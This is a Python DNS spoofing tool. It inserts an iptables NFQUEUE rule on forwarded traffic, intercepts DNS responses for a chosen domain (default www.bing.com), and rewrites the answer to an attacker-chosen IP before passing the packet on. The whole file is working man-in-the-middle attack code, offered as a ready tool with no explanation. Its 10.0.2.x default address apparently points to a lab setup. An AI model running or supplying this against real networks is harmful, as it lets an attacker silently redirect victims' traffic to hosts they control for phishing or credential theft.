#!/usr/bin/env python3
import scapy.all as scapy
import subprocess
import netfilterqueue
import sys
import optparse

DEFAULT_QUEUE_NUM = 0
DEFAULT_QNAME = "www.bing.com"
DEFAULT_SPOOFED_IP = "10.0.2.5"
exit_code = 0
processed_packet_count = 0

parser = optparse.OptionParser()
parser.add_option("-q", "--queue-num", dest="queue_num", default=DEFAULT_QUEUE_NUM, help="IPTables Queue Num")
parser.add_option("-i", "--ip", dest="ip", default=DEFAULT_SPOOFED_IP, help="Spoofed IP address")
parser.add_option("-n", "--name", dest="name", default=DEFAULT_QNAME, help="DNS QNAME that will be spoofed")

parser.add_option("-s", "--start-queue", dest="start_queue", action="store_true", default=False, help="Start IPTables Queue at the beginning")
parser.add_option("-c", "--cleanup-queue", dest="cleanup_queue", action="store_true", default=False, help="Stop IPTables Queue at the cleanup")


def get_arguments():
    options, arguments = parser.parse_args()
    return options

options = get_arguments() 

def start_queue(queue_num):
    queue_num = int(queue_num)
    command_arguments = "iptables -I FORWARD -j NFQUEUE --queue-num " + str(queue_num)
    print("Starting queue "+str(queue_num))
    subprocess.call(command_arguments,  shell=True)

def cleanup_queue(queue_num):
    queue_num = int(queue_num)
    command_arguments = "iptables -D FORWARD -j NFQUEUE --queue-num " + str(queue_num)
    print("Cleaning up queue "+str(queue_num))
    subprocess.call(command_arguments,  shell=True)

def process_packet(packet):
    global processed_packet_count 
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        dns_question = scapy_packet[scapy.DNSQR]
        if bytes(options.name, "ascii") in bytes(str(dns_question.qname), "ascii"):
            processed_packet_count += 1
            print("\r[+] Processed packets: " + str(processed_packet_count), end="")
            answer = scapy.DNSRR(rrname = dns_question.qname,
                rdata = options.ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            packet.set_payload(bytes(scapy_packet))

    packet.accept()

def run_netfilter(queue_num):
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(queue_num, process_packet)
    queue.run()

if (options.start_queue):
    start_queue(options.queue_num)

try:
    run_netfilter(options.queue_num)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C... Quitting!!!")    
except Exception as e:
    print("\n[-] An exception occurred:\n\t" + str(e))
    exit_code = 1
finally:
    if (options.cleanup_queue):
        cleanup_queue(options.queue_num)

exit(exit_code)